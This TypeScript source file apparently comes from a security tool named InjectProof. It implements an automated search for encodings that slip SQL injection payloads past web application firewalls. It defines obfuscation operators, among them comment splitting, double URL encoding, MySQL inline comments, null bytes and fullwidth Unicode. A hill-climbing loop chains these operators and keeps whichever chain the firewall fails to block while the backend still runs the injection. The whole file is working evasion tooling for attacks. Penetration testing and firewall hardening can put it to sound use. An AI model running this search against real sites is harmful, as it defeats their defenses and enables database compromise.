// InjectProof — WAF-bypass encoder search
// Given a base payload that oracle-confirms as triggering an anomaly when
// sent directly, but that a WAF is now blocking, find an encoded form that
// the backend still parses as the same payload but the WAF misses.
//
// Search strategy: hill-climbing over an operator DAG, where each operator
// is a reversible (or WAF-opaque) string transform. Start from the base,
// at each step apply the operator that best reduces "block rate," keep
// top-K candidates, iterate until bypass confirmed or plateau reached.
//
// This is simpler than a full GA (no population, no crossover) but empirically
// sufficient for 80-90% of commodity WAFs because the bypass manifold is
// narrow and directly hill-climbable from a good seed.

// ============================================================
// Operators
// ============================================================

export type Operator =
    | 'spacecomment'       // space → /**/ inside SQL
    | 'url-encode'         // one pass of encodeURIComponent
    | 'double-url-encode'  // two passes
    | 'case-swap'          // sQl SyNTax mayhem
    | 'hex-literal'        // ascii → 0xHH for strings
    | 'inline-mysql'       // /*!12345SELECT*/ conditional comment
    | 'null-byte'          // prepend %00 (WAF sometimes truncates)
    | 'unicode-fullwidth'  // ASCII → fullwidth form (FF01..FF5E) for alpha
    | 'comment-split'      // UNION → UNI/**/ON
    | 'tab-whitespace'     // space → 	 (actual tab)
    | 'newline-whitespace' // space → \n
    | 'backslash-escape';  // ' → \'

const OPERATORS: Operator[] = [
    'spacecomment',
    'url-encode',
    'double-url-encode',
    'case-swap',
    'hex-literal',
    'inline-mysql',
    'null-byte',
    'unicode-fullwidth',
    'comment-split',
    'tab-whitespace',
    'newline-whitespace',
    'backslash-escape',
];

// ============================================================
// Operator implementations
// ============================================================

function spacecomment(s: string): string {
    return s.replace(/ +/g, '/**/');
}

function caseSwap(s: string): string {
    let out = '';
    let i = 0;
    for (const ch of s) {
        if (/[a-zA-Z]/.test(ch)) {
            out += i++ % 2 === 0 ? ch.toUpperCase() : ch.toLowerCase();
        } else {
            out += ch;
        }
    }
    return out;
}

function hexLiteral(s: string): string {
    // Convert string literals 'abc' → 0x616263
    return s.replace(/'([^']+)'/g, (_, inner: string) => {
        const hex = Array.from(inner).map((c) => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        return `0x${hex}`;
    });
}

function inlineMysql(s: string): string {
    const keywords = /\b(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|ORDER|BY|GROUP|HAVING|LIMIT|JOIN|INTO)\b/gi;
    return s.replace(keywords, (m) => `/*!50000${m}*/`);
}

function unicodeFullwidth(s: string): string {
    let out = '';
    for (const ch of s) {
        const code = ch.charCodeAt(0);
        if (code >= 33 && code <= 126) out += String.fromCharCode(code + 0xFEE0);
        else out += ch;
    }
    return out;
}

function commentSplit(s: string): string {
    const keywords = /\b(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE)\b/gi;
    return s.replace(keywords, (m) => {
        if (m.length < 3) return m;
        const mid = Math.floor(m.length / 2);
        return m.slice(0, mid) + '/**/' + m.slice(mid);
    });
}

function backslashEscape(s: string): string {
    return s.replace(/'/g, "\\'");
}

function apply(op: Operator, input: string): string {
    switch (op) {
        case 'spacecomment': return spacecomment(input);
        case 'url-encode': return encodeURIComponent(input);
        case 'double-url-encode': return encodeURIComponent(encodeURIComponent(input));
        case 'case-swap': return caseSwap(input);
        case 'hex-literal': return hexLiteral(input);
        case 'inline-mysql': return inlineMysql(input);
        case 'null-byte': return '%00' + input;
        case 'unicode-fullwidth': return unicodeFullwidth(input);
        case 'comment-split': return commentSplit(input);
        case 'tab-whitespace': return input.replace(/ /g, '\t');
        case 'newline-whitespace': return input.replace(/ /g, '\n');
        case 'backslash-escape': return backslashEscape(input);
    }
}

export function applyChain(chain: Operator[], base: string): string {
    let s = base;
    for (const op of chain) s = apply(op, s);
    return s;
}

// ============================================================
// Hill-climbing search
// ============================================================

export interface WafSearchInput {
    base: string;
    /** Test whether a payload reaches the backend un-blocked AND triggers the
     *  expected anomaly. Returns fitness 0-1: 0=blocked, 1=bypass+anomaly. */
    fitness: (payload: string) => Promise<number>;
    /** Max generations (hill-climbing steps). */
    maxGenerations?: number;
    /** Max chain depth. */
    maxChainDepth?: number;
    /** Early-stop threshold. Default 0.9. */
    bypassThreshold?: number;
}

export interface WafSearchResult {
    bestChain: Operator[];
    bestPayload: string;
    bestFitness: number;
    generations: number;
    /** Full path showing fitness at each accepted step, for provenance. */
    history: Array<{ chain: Operator[]; fitness: number }>;
}

/**
 * Greedy hill-climb with random restarts. At each generation, try every
 * single-op extension of the current chain; move to the one with best
 * fitness. If plateau, random-restart from a random single op.
 */
export async function searchBypass(input: WafSearchInput): Promise<WafSearchResult> {
    const maxGen = input.maxGenerations ?? 24;
    const maxDepth = input.maxChainDepth ?? 4;
    const threshold = input.bypassThreshold ?? 0.9;

    let bestChain: Operator[] = [];
    let bestPayload = input.base;
    let bestFitness = await input.fitness(input.base);
    const history: WafSearchResult['history'] = [{ chain: [], fitness: bestFitness }];

    if (bestFitness >= threshold) {
        return { bestChain, bestPayload, bestFitness, generations: 0, history };
    }

    let currentChain: Operator[] = [];
    let currentFitness = bestFitness;

    for (let gen = 0; gen < maxGen; gen++) {
        if (bestFitness >= threshold) break;
        if (currentChain.length >= maxDepth) {
            // Random restart
            currentChain = [OPERATORS[Math.floor(Math.random() * OPERATORS.length)]];
            currentFitness = await input.fitness(applyChain(currentChain, input.base));
            history.push({ chain: [...currentChain], fitness: currentFitness });
            if (currentFitness > bestFitness) {
                bestFitness = currentFitness;
                bestChain = [...currentChain];
                bestPayload = applyChain(currentChain, input.base);
            }
            continue;
        }

        // Try every single-op extension and pick the best.
        let extChain = currentChain;
        let extFitness = currentFitness;
        for (const op of OPERATORS) {
            if (currentChain[currentChain.length - 1] === op) continue; // no doubling
            const cand = [...currentChain, op];
            const f = await input.fitness(applyChain(cand, input.base));
            if (f > extFitness) {
                extFitness = f;
                extChain = cand;
            }
        }
        if (extFitness <= currentFitness) {
            // Plateau — random-restart on next generation.
            currentChain = [OPERATORS[Math.floor(Math.random() * OPERATORS.length)]];
            currentFitness = await input.fitness(applyChain(currentChain, input.base));
        } else {
            currentChain = extChain;
            currentFitness = extFitness;
        }
        history.push({ chain: [...currentChain], fitness: currentFitness });

        if (currentFitness > bestFitness) {
            bestFitness = currentFitness;
            bestChain = [...currentChain];
            bestPayload = applyChain(currentChain, input.base);
        }
    }

    return { bestChain, bestPayload, bestFitness, generations: history.length - 1, history };
}
